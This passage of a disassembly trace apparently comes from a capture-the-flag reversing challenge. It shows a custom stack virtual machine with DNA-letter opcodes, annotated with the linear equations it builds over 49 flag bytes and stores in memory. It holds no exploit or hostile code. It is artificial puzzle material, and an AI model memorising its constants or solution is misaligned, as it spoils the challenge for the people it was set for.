push(#000000a0)\n05342 : TA               push(pop() * pop())\n05344 : TCTAATTCCCCC     push(mem[#0296])\n05350 : CCCCGACCCCCC     push(#00000070)\n0535c : TA               push(pop() * pop())\n0535e : TCGAATTCCCCC     push(mem[#0297])\n0536a : CCAGCTCCCCCC     push(#0000008d)\n05376 : TA               push(pop() * pop())\n05378 : TCCTATTCCCCC     push(mem[#0298])\n05384 : CCCCCACCCCCC     push(#00000040)\n05390 : TA               push(pop() * pop())\n05392 : TCATATTCCCCC     push(mem[#0299])\n0539e : CCAGTGCCCCCC     push(#000000ed)\n053aa : TA               push(pop() * pop())\n053ac : TCTTATTCCCCC     push(mem[#029a])\n053b8 : CCAAACCCCCCC     push(#00000015)\n053c4 : TA               push(pop() * pop())\n053c6 : TCGTATTCCCCC     push(mem[#029b])\n053d2 : CCTGTACCCCCC     push(#0000006e)\n053de : TA               push(pop() * pop())\n053e0 : TCCGATTCCCCC     push(mem[#029c])\n053ec : CCGCAACCCCCC     push(#00000053)\n053f8 : TA               push(pop() * pop())\n053fa : TCAGATTCCCCC     push(mem[#029d])\n05406 : CCATAGCCCCCC     push(#000000d9)\n05412 : TA               push(pop() * pop())\n05414 : TCTGATTCCCCC     push(mem[#029e])\n05420 : CCTGAGCCCCCC     push(#000000de)\n0542c : TA               push(pop() * pop())\n0542e : TCGGATTCCCCC     push(mem[#029f])\n0543a : CCTAGCCCCCCC     push(#00000036)\n05446 : TA               push(pop() * pop())\n05448 : TCCCTTTCCCCC     push(mem[#02a0])\n05454 : CCTCCGCCCCCC     push(#000000c2)\n05460 : TA               push(pop() * pop())\n05462 : TCACTTTCCCCC     push(mem[#02a1])\n0546e : CCATCGCCCCCC     push(#000000c9)\n0547a : TA               push(pop() * pop())\n0547c : TCTCTTTCCCCC     push(mem[#02a2])\n05488 : CCGCTGCCCCCC     push(#000000e3)\n05494 : TA               push(pop() * pop())\n05496 : TCGCTTTCCCCC     push(mem[#02a3])\n054a2 : CCAAATCCCCCC     push(#00000095)\n054ae : TA               push(pop() * pop())\n054b0 : TCCATTTCCCCC     push(mem[#02a4])\n054bc : CCTCGGCCCCCC     push(#000000f2)\n054c8 : TA               push(pop() * pop())\n054ca : TCAATTTCCCCC     push(mem[#02a5])\n054d6 : CCTTCCCCCCCC     push(#0000000a)\n054e2 : TA               push(pop() * pop())\n054e4 : TCTATTTCCCCC     push(mem[#02a6])\n054f0 : CCTGCACCCCCC     push(#0000004e)\n054fc : TA               push(pop() * pop())\n054fe : TCGATTTCCCCC     push(mem[#02a7])\n0550a : CCTGGGCCCCCC     push(#000000fe)\n05516 : TA               push(pop() * pop())\n05518 : TCCTTTTCCCCC     push(mem[#02a8])\n05524 : CCCACGCCCCCC     push(#000000c4)\n05530 : TA               push(pop() * pop())\n05532 : TCATTTTCCCCC     push(mem[#02a9])\n0553e : CCTCCTCCCCCC     push(#00000082)\n0554a : TA               push(pop() * pop())\n0554c : TCTTTTTCCCCC     push(mem[#02aa])\n05558 : CCCTTGCCCCCC     push(#000000e8)\n05564 : TA               push(pop() * pop())\n05566 : TCGTTTTCCCCC     push(mem[#02ab])\n05572 : CCGCGACCCCCC     push(#00000073)\n0557e : TA               push(pop() * pop())\n05580 : TCCGTTTCCCCC     push(mem[#02ac])\n0558c : CCTGGCCCCCCC     push(#0000003e)\n05598 : TA               push(pop() * pop())\n0559a : TCAGTTTCCCCC     push(mem[#02ad])\n055a6 : CCGGATCCCCCC     push(#0000009f)\n055b2 : TA               push(pop() * pop())\n055b4 : TCTGTTTCCCCC     push(mem[#02ae])\n055c0 : CCCATTCCCCCC     push(#000000a4)\n055cc : TA               push(pop() * pop())\n055ce : TCGGTTTCCCCC     push(mem[#02af])\n055da : CCTGACCCCCCC     push(#0000001e)\n055e6 : TA               push(pop() * pop())\n055e8 : TCCCGTTCCCCC     push(mem[#02b0])\n055f4 : CCCTCACCCCCC     push(#00000048)\n05600 : TA               push(pop() * pop())\n05602 : CA               push(pop() + pop())\n05604 : CA               push(pop() + pop())\n05606 : CA               push(pop() + pop())\n05608 : CA               push(pop() + pop())\n0560a : CA               push(pop() + pop())\n0560c : CA               push(pop() + pop())\n0560e : CA               push(pop() + pop())\n05610 : CA               push(pop() + pop())\n05612 : CA               push(pop() + pop())\n05614 : CA               push(pop() + pop())\n05616 : CA               push(pop() + pop())\n05618 : CA               push(pop() + pop())\n0561a : CA               push(pop() + pop())\n0561c : CA               push(pop() + pop())\n0561e : CA               push(pop() + pop())\n05620 : CA               push(pop() + pop())\n05622 : CA               push(pop() + pop())\n05624 : CA               push(pop() + pop())\n05626 : CA               push(pop() + pop())\n05628 : CA               push(pop() + pop())\n0562a : CA               push(pop() + pop())\n0562c : CA               push(pop() + pop())\n0562e : CA               push(pop() + pop())\n05630 : CA               push(pop() + pop())\n05632 : CA               push(pop() + pop())\n05634 : CA               push(pop() + pop())\n05636 : CA               push(pop() + pop())\n05638 : CA               push(pop() + pop())\n0563a : CA               push(pop() + pop())\n0563c : CA               push(pop() + pop())\n0563e : CA               push(pop() + pop())\n05640 : CA               push(pop() + pop())\n05642 : CA               push(pop() + pop())\n05644 : CA               push(pop() + pop())\n05646 : CA               push(pop() + pop())\n05648 : CA               push(pop() + pop())\n0564a : CA               push(pop() + pop())\n0564c : CA               push(pop() + pop())\n0564e : CA               push(pop() + pop())\n05650 : CA               push(pop() + pop())\n05652 : CA               push(pop() + pop())\n05654 : CA               push(pop() + pop())\n05656 : CA               push(pop() + pop())\n05658 : CA               push(pop() + pop())\n0565a : CA               push(pop() + pop())\n0565c : CA               push(pop() + pop())\n0565e : CA               push(pop() + pop())\n05660 : CA               push(pop() + pop())\n05662 : GCCGGCCCACCC     mem[#103c] := pop()           memory[#0103c] := ((flag[0] * 251) + ((flag[1] * 59) + ((flag[2] * 207) + ((flag[3] * 64) + ((flag[4] * 175) + ((flag[5] * 77) + ((flag[6] * 94) + ((flag[7] * 243) + ((flag[8] * 222) + ((flag[9] * 81) + ((flag[10] * 138) + ((flag[11] * 176) + ((flag[12] * 175) + ((flag[13] * 83) + ((flag[14] * 74) + ((flag[15] * 160) + ((flag[16] * 243) + ((flag[17] * 128) + ((flag[18] * 222) + ((flag[19] * 56) + ((flag[20] * 7) + ((flag[21] * 160) + ((flag[22] * 112) + ((flag[23] * 141) + ((flag[24] * 64) + ((flag[25] * 237) + ((flag[26] * 21) + ((flag[27] * 110) + ((flag[28] * 83) + ((flag[29] * 217) + ((flag[30] * 222) + ((flag[31] * 54) + ((flag[32] * 194) + ((flag[33] * 201) + ((flag[34] * 227) + ((flag[35] * 149) + ((flag[36] * 242) + ((flag[37] * 10) + ((flag[38] * 78) + ((flag[39] * 254) + ((flag[40] * 196) + ((flag[41] * 130) + ((flag[42] * 232) + ((flag[43] * 115) + ((flag[44] * 62) + ((flag[45] * 159) + ((flag[46] * 164) + ((flag[47] * 30) + (flag[48] * 72)))))))))))))))))))))))))))))))))))))))))))))))))\n0566e : TCCCCTTCCCCC     push(mem[#0280])\n0567a : CCTGTACCCCCC     push(#0000006e)\n05686 : TA               push(pop() * pop())\n05688 : TCACCTTCCCCC     push(mem[#0281])\n05694 : CCTTGTCCCCCC     push(#000000ba)\n056a0 : TA               push(pop() * pop())\n056a2 : TCTCCTTCCCCC     push(mem[#0282])\n056ae : CCTTTCCCCCCC     push(#0000002a)\n056ba : TA               push(pop() * pop())\n056bc : TCGCCTTCCCCC     push(mem[#0283])\n056c8 : CCTGCTCCCCCC     push(#0000008e)\n056d4 : TA               push(pop() * pop())\n056d6 : TCCACTTCCCCC     push(mem[#0284])\n056e2 : CCTCTTCCCCCC     push(#000000a2)\n056ee : TA               push(pop() * pop())\n056f0 : TCAACTTCCCCC     push(mem[#0285])\n056fc : CCGATGCCCCCC     push(#000000e7)\n05708 : TA               push(pop() * pop())\n0570a : TCTACTTCCCCC     push(mem[#0286])\n05716 : CCTGTGCCCCCC     push(#000000ee)\n05722 : TA               push(pop() * pop())\n05724 : TCGACTTCCCCC     push(mem[#0287])\n05730 : CCATGACCCCCC     push(#00000079)\n0573c : TA               push(pop() * pop())\n0573e : TCCTCTTCCCCC     push(mem[#0288])\n0574a : CCAGTACCCCCC     push(#0000006d)\n05756 : TA               push(pop() * pop())\n05758 : TCATCTTCCCCC     push(mem[#0289])\n05764 : CCTAAGCCCCCC     push(#000000d6)\n05770 : TA               push(pop() * pop())\n05772 : TCTTCTTCCCCC     push(mem[#028a])\n0577e : CCCCCACCCCCC     push(#00000040)\n0578a : TA               push(pop() * pop())\n0578c : TCGTCTTCCCCC     push(mem[#028b])\n05798 : CCTGAGCCCCCC     push(#000000de)\n057a4 : TA               push(pop() * pop())\n057a6 : TCCGCTTCCCCC     push(mem[#028c])\n057b2 : CCTCGTCCCCCC     push(#000000b2)\n057be : TA               push(pop() * pop())\n057c0 : TCAGCTTCCCCC     push(mem[#028d])\n057cc : CCGCCACCCCCC     push(#00000043)\n057d8 : TA               push(pop() * pop())\n057da : TCTGCTTCCCCC     push(mem[#028e])\n057e6 : CCTCGACCCCCC     push(#00000072)\n057f2 : TA               push(pop() * pop())\n057f4 : TCGGCTTCCCCC     push(mem[#028f])\n05800 : CCACCGCCCCCC     push(#000000c1)\n0580c : TA               push(pop() * pop())\n0580e : TCCCATTCCCCC     push(mem[#0290])\n0581a : CCTGCACCCCCC     push(#0000004e)\n05826 : TA               push(pop() * pop())\n05828 : TCACATTCCCCC     push(mem[#0291])\n05834 : CCTTAACCCCCC     push(#0000005a)\n05840 : TA               push(pop() * pop())\n05842 : TCTCATTCCCCC     push(mem[#0292])\n0584e : CCGATCCCCCCC     push(#00000027)\n0585a : TA               push(pop() * pop())\n0585c : TCGCATTCCCCC     push(mem[#0293])\n05868 : CCGCTCCCCCCC     push(#00000023)\n05874 : TA               push(pop() * pop())\n05876 : TCCAATTCCCCC     push(mem[#0294])\n05882 : CCAAGTCCCCCC     push(#000000b5)\n0588e : TA               push(pop() * pop())\n05890 : TCAAATTCCCCC     push(mem[#0295])\n0589c : CCTAGTCCCCCC     push(#000000b6)\n058a8 : TA               push(pop() * pop())\n058aa : TCTAATTCCCCC     push(mem[#0296])\n058b6 : CCGCTACCCCCC     push(#00000063)\n058c2 : TA               push(pop() * pop())\n058c4 : TCGAATTCCCCC     push(mem[#0297])\n058d0 : CCGACCCCCCCC     push(#00000007)\n058dc : TA               push(pop() * pop())\n058de : TCCTATTCCCCC     push(mem[#0298])\n058ea : CCACGTCCCCCC     push(#000000b1)\n058f6 : TA               push(pop() * pop())\n058f8 : TCATATTCCCCC     push(mem[#0299])\n05904 : CCCAACCCCCCC     push(#00000014)\n05910 : TA               push(pop() * pop())\n05912 : TCTTATTCCCCC     push(mem[#029a])\n0591e : CCGCCTCCCCCC     push(#00000083)\n0592a : TA               push(pop() * pop())\n0592c : TCGTATTCCCCC     push(mem[#029b])\n05938 : CCTTTACCCCCC     push(#0000006a)\n05944 : TA               push(pop() * pop())\n05946 : TCCGATTCCCCC     push(mem[#029c])\n05952 : CCATGGCCCCCC     push(#000000f9)\n0595e : TA               push(pop() * pop())\n05960 : TCAGATTCCCCC     push(mem[#029d])\n0596c : CCAATACCCCCC     push(#00000065)\n05978 : TA               push(pop() * pop())\n0597a : TCTGATTCCCCC     push(mem[#029e])\n05986 : CCATATCCCCCC     push(#00000099)\n05992 : TA               push(pop() * pop())\n05994 : TCGGATTCCCCC     push(mem[#029f])\n059a0 : CCGTTCCCCCCC     push(#0000002b)\n059ac : TA               push(pop() * pop())\n059ae : TCCCTTTCCCCC     push(mem[#02a0])\n059ba : CCAGTGCCCCCC     push(#000000ed)\n059c6 : TA               push(pop() * pop())\n059c8 : TCACTTTCCCCC     push(mem[#02a1])\n059d4 : CCACACCCCCCC     push(#00000011)\n059e0 : TA               push(pop() * pop())\n059e2 : TCTCTTTCCCCC     push(mem[#02a2])\n059ee : CCTAGCCCCCCC     push(#00000036)\n059fa : TA               push(pop() * pop())\n059fc : TCGCTTTCCCCC     push(mem[#02a3])\n05a08 : CCACTACCCCCC     push(#00000061)\n05a14 : TA               push(pop() * pop())\n05a16 : TCCATTTCCCCC     push(mem[#02a4])\n05a22 : CCAGTTCCCCCC     push(#000000ad)\n05a2e : TA               push(pop() * pop())\n05a30 : TCAATTTCCCCC     push(mem[#02a5])\n05a3c : CCGGGCCCCCCC     push(#0000003f)\n05a48 : TA               push(pop() * pop())\n05a4a : TCTATTTCCCCC     push(mem[#02a6])\n05a56 : CCACCGCCCCCC     push(#000000c1)\n05a62 : TA               push(pop() * pop())\n05a64 : TCGATTTCCCCC     push(mem[#02a7])\n05a70 : CCGCGACCCCCC     push(#00000073)\n05a7c : TA               push(pop() * pop())\n05a7e : TCCTTTTCCCCC     push(mem[#02a8])\n05a8a : CCACACCCCCCC     push(#00000011)\n05a96 : TA               push(pop() * pop())\n05a98 : TCATTTTCCCCC     push(mem[#02a9])\n05aa4 : CCCCCGCCCCCC     push(#000000c0)\n05ab0 : TA               push(pop() * pop())\n05ab2 : TCTTTTTCCCCC     push(mem[#02aa])\n05abe : CCGTCCCCCCCC     push(#0000000b)\n05aca : TA               push(pop() * pop())\n05acc : TCGTTTTCCCCC     push(mem[#02ab])\n05ad8 : CCCGGGCCCCCC     push(#000000fc)\n05ae4 : TA               push(pop() * pop())\n05ae6 : TCCGTTTCCCCC     push(mem[#02ac])\n05af2 : CCGTCACCCCCC     push(#0000004b)\n05afe : TA               push(pop() * pop())\n05b00 : TCAGTTTCCCCC     push(mem[#02ad])\n05b0c : CCGACCCCCCCC     push(#00000007)\n05b18 : TA               push(pop() * pop())\n05b1a : TCTGTTTCCCCC     push(mem[#02ae])\n05b26 : CCTAAGCCCCCC     push(#000000d6)\n05b32 : TA               push(pop() * pop())\n05b34 : TCGGTTTCCCCC     push(mem[#02af])\n05b40 : CCGCTTCCCCCC     push(#000000a3)\n05b4c : TA               push(pop() * pop())\n05b4e : TCCCGTTCCCCC     push(mem[#02b0])\n05b5a : CCATCTCCCCCC     push(#00000089)\n05b66 : TA               push(pop() * pop())\n05b68 : CA               push(pop() + pop())\n05b6a : CA               push(pop() + pop())\n05b6c : CA               push(pop() + pop())\n05b6e : CA               push(pop() + pop())\n05b70 : CA               push(pop() + pop())\n05b72 : CA               push(pop() + pop())\n05b74 : CA               push(pop() + pop())\n05b76 : CA               push(pop() + pop())\n05b78 : CA               push(pop() + pop())\n05b7a : CA               push(pop() + pop())\n05b7c : CA               push(pop() + pop())\n05b7e : CA               push(pop() + pop())\n05b80 : CA               push(pop() + pop())\n05b82 : CA               push(pop() + pop())\n05b84 : CA               push(pop() + pop())\n05b86 : CA               push(pop() + pop())\n05b88 : CA               push(pop() + pop())\n05b8a : CA               push(pop() + pop())\n05b8c : CA               push(pop() + pop())\n05b8e : CA               push(pop() + pop())\n05b90 : CA               push(pop() + pop())\n05b92 : CA               push(pop() + pop())\n05b94 : CA               push(pop() + pop())\n05b96 : CA               push(pop() + pop())\n05b98 : CA               push(pop() + pop())\n05b9a : CA               push(pop() + pop())\n05b9c : CA               push(pop() + pop())\n05b9e : CA               push(pop() + pop())\n05ba0 : CA               push(pop() + pop())\n05ba2 : CA               push(pop() + pop())\n05ba4 : CA               push(pop() + pop())\n05ba6 : CA               push(pop() + pop())\n05ba8 : CA               push(pop() + pop())\n05baa : CA               push(pop() + pop())\n05bac : CA               push(pop() + pop())\n05bae : CA               push(pop() + pop())\n05bb0 : CA               push(pop() + pop())\n05bb2 : CA               push(pop() + pop())\n05bb4 : CA               push(pop() + pop())\n05bb6 : CA               push(pop() + pop())\n05bb8 : CA               push(pop() + pop())\n05bba : CA               push(pop() + pop())\n05bbc : CA               push(pop() + pop())\n05bbe : CA               push(pop() + pop())\n05bc0 : CA               push(pop() + pop())\n05bc2 : CA               push(pop() + pop())\n05bc4 : CA               push(pop() + pop())\n05bc6 : CA               push(pop() + pop())\n05bc8 : GCCCCACCACCC     mem[#1040] := pop()           memory[#01040] := ((flag[0] * 110) + ((flag[1] * 186) + ((flag[2] * 42) + ((flag[3] * 142) + ((flag[4] * 162) + ((flag[5] * 231) + ((flag[6] * 238) + ((flag[7] * 121) + ((flag[8] * 109) + ((flag[9] * 214) + ((flag[10] * 64) + ((flag[11] * 222) + ((flag[12] * 178) + ((flag[13] * 67) + ((flag[14] * 114) + ((flag[15] * 193) + ((flag[16] * 78) + ((flag[17] * 90) + ((flag[18] * 39) + ((flag[19] * 35) + ((flag[20] * 181) + ((flag[21] * 182) + ((flag[22] * 99) + ((flag[23] * 7) + ((flag[24] * 177) + ((flag[25] * 20) + ((flag[26] * 131) + ((flag[27] * 106) + ((flag[28] * 249) + ((flag[29] * 101) + ((flag[30] * 153) + ((flag[31] * 43) + ((flag[32] * 237) + ((flag[33] * 17) + ((flag[34] * 54) + ((flag[35] * 97) + ((flag[36] * 173) + ((flag[37] * 63) + ((flag[38] * 193) + ((flag[39] * 115) + ((flag[40] * 17) + ((flag[41] * 192) + ((flag[42] * 11) + ((flag[43] * 252) + ((flag[44] * 75) + ((flag[45] * 7) + ((flag[46] * 214) + ((flag[47] * 163) + (flag[48] * 137)))))))))))))))))))))))))))))))))))))))))))))))))\n05bd4 : TCCCCTTCCCCC     push(mem[#0280])\n05be0 : CCAGATCCCCCC     push(#0000009d)\n05bec : TA               push(pop() * pop())\n05bee : TCACCTTCCCCC     push(mem[#0281])\n05bfa : CCGGTTCCCCCC     push(#000000af)\n05c06 : TA               push(pop() * pop())\n05c08 : TCTCCTTCCCCC     push(mem[#0282])\n05c14 : CCGAGACCCCCC     push(#00000077)\n05c20 : TA               push(pop() * pop())\n05c22 : TCGCCTTCCCCC     push(mem[#0283])\n05c2e : CCAACTCCCCCC     push(#00000085)\n05c3a : TA               push(pop() * pop())\n05c3c : TCCACTTCCCCC     push(mem[#0284])\n05c48 : CCGAAGCCCCCC     push(#000000d7)\n05c54 : TA               push(pop() * pop())\n05c56 : TCAACTTCCCCC     push(mem[#0285])\n05c62 : CCGTTGCCCCCC     push(#000000eb)\n05c6e : TA               push(pop() * pop())\n05c70 : TCTACTTCCCCC     push(mem[#0286])\n05c7c : CCGGAGCCCCCC     push(#000000df)\n05c88 : TA               push(pop() * pop())\n05c8a : TCGACTTCCCCC     push(mem[#0287])\n05c96 : CCTACCCCCCCC     push(#00000006)\n05ca2 : TA               push(pop() * pop())\n05ca4 : TCCTCTTCCCCC     push(mem[#0288])\n05cb0 : CCGCCGCCCCCC     push(#000000c3)\n05cbc : TA               push(pop() * pop())\n05cbe : TCATCTTCCCCC     push(mem[#0289])\n05cca : CCAATTCCCCCC     push(#000000a5)\n05cd6 : TA               push(pop() * pop())\n05cd8 : TCTTCTTCCCCC     push(mem[#028a])\n05ce4 : CCCGATCCCCCC     push(#0000009c)\n05cf0 : TA               push(pop() * pop())\n05cf2 : TCGTCTTCCCCC     push(mem[#028b])\n05cfe : CCGGGCCCCCCC     push(#0000003f)\n05d0a : TA               push(pop() * pop())\n05d0c : TCCGCTTCCCCC     push(mem[#028c])\n05d18 : CCCTCACCCCCC     push(#00000048)\n05d24 : TA               push(pop() * pop())\n05d26 : TCAGCTTCCCCC     push(mem[#028d])\n05d32 : CCTCCCCCCCCC     push(#00000002)\n05d3e : TA               push(pop() * pop())\n05d40 : TCTGCTTCCCCC     push(mem[#028e])\n05d4c : CCACCGCCCCCC     push(#000000c1)\n05d58 : TA               push(pop() * pop())\n05d5a : TCGGCTTCCCCC     push(mem[#028f])\n05d66 : CCCTGTCCCCCC     push(#000000b8)\n05d72 : TA               push(pop() * pop())\n05d74 : TCCCATTCCCCC     push(mem[#0290])\n05d80 : CCGATCCCCCCC     push(#00000027)\n05d8c : TA               push(pop() * pop())\n05d8e : TCACATTCCCCC     push(mem[#0291])\n05d9a : CCGATGCCCCCC     push(#000000e7)\n05da6 : TA               push(pop() * pop())\n05da8 : TCTCATTCCCCC     push(mem[#0292])\n05db4 : CCGTATCCCCCC     push(#0000009b)\n05dc0 : TA               push(pop() * pop())\n05dc2 : TCGCATTCCCCC     push(mem[#0293])\n05dce : CCTCTACCCCCC     push(#00000062)\n05dda : TA               push(pop() * pop())\n05ddc : TCCAATTCCCCC     push(mem[#0294])\n05de8 : CCGGCACCCCCC     push(#0000004f)\n05df4 : TA               push(pop() * pop())\n05df6 : TCAAATTCCCCC     push(mem[#0295])\n05e02 : CCGAGTCCCCCC     push(#000000b7)\n05e0e : TA               push(pop() * pop())\n05e10 : TCTAATTCCCCC     push(mem[#0296])\n05e1c : CCATGTCCCCCC     push(#000000b9)\n05e28 : TA               push(pop() * pop())\n05e2a : TCGAATTCCCCC     push(mem[#0297])\n05e36 : CCTCATCCCCCC     push(#00000092)\n05e42 : TA               push(pop() * pop())\n05e44 : TCCTATTCCCCC     push(mem[#0298])\n05e50 : CCTGGCCCCCCC     push(#0000003e)\n05e5c : TA               push(pop() * pop())\n05e5e : TCATATTCCCCC     push(mem[#0299])\n05e6a : CCCAAACCCCCC     push(#00000054)\n05e76 : TA               push(pop() * pop())\n05e78 : TCTTATTCCCCC     push(mem[#029a])\n05e84 : CCCTAGCCCCCC     push(#000000d8)\n05e90 : TA               push(pop() * pop())\n05e92 : TCGTATTCCCCC     push(mem[#029b])\n05e9e : CCTAGGCCCCCC     push(#000000f6)\n05eaa : TA               push(pop() * pop())\n05eac : TCCGATTCCCCC     push(mem[#029c])\n05eb8 : CCGTAACCCCCC     push(#0000005b)\n05ec4 : TA               push(pop() * pop())\n05ec6 : TCAGATTCCCCC     push(mem[#029d])\n05ed2 : CCATAGCCCCCC     push(#000000d9)\n05ede : TA               push(pop() * pop())\n05ee0 : TCTGATTCCCCC     push(mem[#029e])\n05eec : CCTCAACCCCCC     push(#00000052)\n05ef8 : TA               push(pop() * pop())\n05efa : TCGGATTCCCCC     push(mem[#029f])\n05f06 : CCAGAACCCCCC     push(#0000005d)\n05f12 : TA               push(pop() * pop())\n05f14 : TCCCTTTCCCCC     push(mem[#02a0])\n05f20 : CCCAGCCCCCCC     push(#00000034)\n05f2c : TA               push(pop() * pop())\n05f2e : TCACTTTCCCCC     push(mem[#02a1])\n05f3a : CCACTTCCCCCC     push(#000000a1)\n05f46 : TA               push(pop() * pop())\n05f48 : TCTCTTTCCCCC     push(mem[#02a2])\n05f54 : CCTTCACCCCCC     push(#0000004a)\n05f60 : TA               push(pop() * pop())\n05f62 : TCGCTTTCCCCC     push(mem[#02a3])\n05f6e : CCAGCCCCCCCC     push(#0000000d)\n05f7a : TA               push(pop() * pop())\n05f7c : TCCATTTCCCCC     push(mem[#02a4])\n05f88 : CCCATCCCCCCC     push(#00000024)\n05f94 : TA               push(pop() * pop())\n05f96 : TCAATTTCCCCC     push(mem[#02a5])\n05fa2 : CCTCGCCCCCCC     push(#00000032)\n05fae : TA               push(pop() * pop())\n05fb0 : TCTATTTCCCCC     push(mem[#02a6])\n05fbc : CCTCTCCCCCCC     push(#00000022)\n05fc8 : TA               push(pop() * pop())\n05fca : TCGATTTCCCCC     push(mem[#02a7])\n05fd6 : CCTAAACCCCCC     push(#00000056)\n05fe2 : TA               push(pop() * pop())\n05fe4 : TCCTTTTCCCCC     push(mem[#02a8])\n05ff0 : CCTATACCCCCC     push(#00000066)\n05ffc : TA               push(pop() * pop())\n05ffe : TCATTTTCCCCC     push(mem[#02a9])\n0600a : CCTATCCCCCCC     push(#00000026)\n06016 : TA               push(pop() * pop())\n06018 : TCTTTTTCCCCC     push(mem[#02aa])\n06024 : CCAAACCCCCCC     push(#00000015)\n06030 : TA               push(pop() * pop())\n06032 : TCGTTTTCCCCC     push(mem[#02ab])\n0603e : CCTTGACCCCCC     push(#0000007a)\n0604a : TA               push(pop() * pop())\n0604c : TCCGTTTCCCCC     push(mem[#02ac])\n06058 : CCGCCACCCCCC     push(#00000043)\n06064 : TA               push(pop() * pop())\n06066 : TCAGTTTCCCCC     push(mem[#02ad])\n06072 : CCCGACCCCCCC     push(#0000001c)\n0607e : TA               push(pop() * pop())\n06080 : TCTGTTTCCCCC     push(mem[#02ae])\n0608c : CCTTGTCCCCCC     push(#000000ba)\n06098 : TA               push(pop() * pop())\n0609a : TCGGTTTCCCCC     push(mem[#02af])\n060a6 : CCCTACCCCCCC     push(#00000018)\n060b2 : TA               push(pop() * pop())\n060b4 : TCCCGTTCCCCC     push(mem[#02b0])\n060c0 : CCGGGTCCCCCC     push(#000000bf)\n060cc : TA               push(pop() * pop())\n060ce : CA               push(pop() + pop())\n060d0 : CA               push(pop() + pop())\n060d2 : CA               push(pop() + pop())\n060d4 : CA               push(pop() + pop())\n060d6 : CA               push(pop() + pop())\n060d8 : CA               push(pop() + pop())\n060da : CA               push(pop() + pop())\n060dc : CA               push(pop() + pop())\n060de : CA               push(pop() + pop())\n060e0 : CA               push(pop() + pop())\n060e2 : CA               push(pop() + pop())\n060e4 : CA               push(pop() + pop())\n060e6 : CA               push(pop() + pop())\n060e8 : CA               push(pop() + pop())\n060ea : CA               push(pop() + pop())\n060ec : CA               push(pop() + pop())\n060ee : CA               push(pop() + pop())\n060f0 : CA               push(pop() + pop())\n060f2 : CA               push(pop() + pop())\n060f4 : CA               push(pop() + pop())\n060f6 : CA               push(pop() + pop())\n060f8 : CA               push(pop() + pop())\n060fa : CA               push(pop() + pop())\n060fc : CA               push(pop() + pop())\n060fe : CA               push(pop() + pop())\n06100 : CA               push(pop() + pop())\n06102 : CA               push(pop() + pop())\n06104 : CA               push(pop() + pop())\n06106 : CA               push(pop() + pop())\n06108 : CA               push(pop() + pop())\n0610a : CA               push(pop() + pop())\n0610c : CA               push(pop() + pop())\n0610e : CA               push(pop() + pop())\n06110 : CA               push(pop() + pop())\n06112 : CA               push(pop() + pop())\n06114 : CA               push(pop() + pop())\n06116 : CA               push(pop() + pop())\n06118 : CA               push(pop() + pop())\n0611a : CA               push(pop() + pop())\n0611c : CA               push(pop() + pop())\n0611e : CA               push(pop() + pop())\n06120 : CA               push(pop() + pop())\n06122 : CA               push(pop() + pop())\n06124 : CA               push(pop() + pop())\n06126 : CA               push(pop() + pop())\n06128 : CA               push(pop() + pop())\n0612a : CA               push(pop() + pop())\n0612c : CA               push(pop() + pop())\n0612e : GCCACACCACCC     mem[#1044] := pop()           memory[#01044] := ((flag[0] * 157) + ((flag[1] * 175) + ((flag[2] * 119) + ((flag[3] * 133) + ((flag[4] * 215) + ((flag[5] * 235) + ((flag[6] * 223) + ((flag[7] * 6) + ((flag[8] * 195) + ((flag[9] * 165) + ((flag[10] * 156) + ((flag[11] * 63) + ((flag[12] * 72) + ((flag[13] * 2) + ((flag[14] * 193) + ((flag[15] * 184) + ((flag[16] * 39) + ((flag[17] * 231) + ((flag[18] * 155) + ((flag[19] * 98) + ((flag[20] * 79) + ((flag[21] * 183) + ((flag[22] * 185) + ((flag[23] * 146) + ((flag[24] * 62) + ((flag[25] * 84) + ((flag[26] * 216) + ((flag[27] * 246) + ((flag[28] * 91) + ((flag[29] * 217) + ((flag[30] * 82) + ((flag[31] * 93) + ((flag[32] * 52) + ((flag[33] * 161) + ((flag[34] * 74) + ((flag[35] * 13) + ((flag[36] * 36) + ((flag[37] * 50) + ((flag[38] * 34) + ((flag[39] * 86) + ((flag[40] * 102) + ((flag[41] * 38) + ((flag[42] * 21) + ((flag[43] * 122) + ((flag[44] * 67) + ((flag[45] * 28) + ((flag[46] * 186) + ((flag[47] * 24) + (flag[48] * 191)))))))))))))))))))))))))))))))))))))))))))))))))\n0613a : TCCCCTTCCCCC     push(mem[#0280])\n06146 : CCTATTCCCCCC     push(#000000a6)\n06152 : TA               push(pop() * pop())\n06154 : TCACCTTCCCCC     push(mem[#0281])\n06160 : CCCGAACCCCCC     push(#0000005c)\n0616c : TA               push(pop() * pop())\n0616e : TCTCCTTCCCCC     push(mem[#0282])\n0617a : CCGCCGCCCCCC     push(#000000c3)\n06186 : TA               push(pop() * pop())\n06188 : TCGCCTTCCCCC     push(mem[#0283])\n06194 : CCACCACCCCCC     push(#00000041)\n061a0 : TA               push(pop() * pop())\n061a2 : TCCACTTCCCCC     push(mem[#0284])\n061ae : CCACGTCCCCCC     push(#000000b1)\n061ba : TA               push(pop() * pop())\n061bc : TCAACTTCCCCC     push(mem[#0285])\n061c8 : CCACCGCCCCCC     push(#000000c1)\n061d4 : TA               push(pop() * pop())\n061d6 : TCTACTTCCCCC     push(mem[#0286])\n061e2 : CCTAATCCCCCC     push(#00000096)\n061ee : TA               push(pop() * pop())\n061f0 : TCGACTTCCCCC     push(mem[#0287])\n061fc : CCATATCCCCCC     push(#00000099)\n06208 : TA               push(pop() * pop())\n0620a : TCCTCTTCCCCC     push(mem[#0288])\n06216 : CCGTTGCCCCCC     push(#000000eb)\n06222 : TA               push(pop() * pop())\n06224 : TCATCTTCCCCC     push(mem[#0289])\n06230 : CCCATTCCCCCC     push(#000000a4)\n0623c : TA               push(pop() * pop())\n0623e : TCTTCTTCCCCC     push(mem[#028a])\n0624a : CCACGTCCCCCC     push(#000000b1)\n06256 : TA               push(pop() * pop())\n06258 : TCGTCTTCCCCC     push(mem[#028b])\n06264 : CCCAGCCCCCCC     push(#00000034)\n06270 : TA               push(pop() * pop())\n06272 : TCCGCTTCCCCC     push(mem[#028c])\n0627e : CCGATCCCCCCC     push(#00000027)\n0628a : TA               push(pop() * pop())\n0628c : TCAGCTTCCCCC     push(mem[#028d])\n06298 : CCGGCTCCCCCC     push(#0000008f)\n062a4 : TA               push(pop() * pop())\n062a6 : TCTGCTTCCCCC     push(mem[#028e])\n062b2 : CCCTACCCCCCC     push(#00000018)\n062be : TA               push(pop() * pop())\n062c0 : TCGGCTTCCCCC     push(mem[#028f])\n062cc : CCAAAACCCCCC     push(#00000055)\n062d8 : TA               push(pop() * pop())\n062da : TCCCATTCCCCC     